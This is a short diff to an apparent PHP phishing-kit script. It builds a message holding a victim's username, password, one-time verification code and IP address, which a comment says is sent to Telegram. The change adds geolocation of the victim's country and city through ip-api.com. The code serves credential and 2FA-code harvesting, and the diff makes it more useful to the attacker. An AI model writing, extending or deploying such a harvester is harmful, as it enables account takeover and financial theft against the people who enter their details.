@@ -15,7 +15,11 @@ function getIP(){
 }
 
 $ip = getIP();
+// 🌍 GEOLOCALIZACIÓN
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
 
+$pais = ($geo && $geo->status == "success") ? $geo->country : "Desconocido";
+$ciudad = ($geo && $geo->status == "success") ? $geo->city : "Desconocido";
 // 🕒 HORA
 $fecha = date("Y-m-d H:i:s");
 
@@ -29,6 +33,8 @@ $mensaje .= "👤 Usuario: $usuario\n";
 $mensaje .= "🔑 Clave: $clave\n";
 $mensaje .= "📲 Código: $codigo\n\n";
 $mensaje .= "🌐 IP: $ip\n";
+$mensaje .= "📍 País: $pais\n";
+$mensaje .= "🏙 Ciudad: $ciudad\n";
 $mensaje .= "🕒 Hora: $fecha";
 
 // 🚀 ENVÍO A TELEGRAM
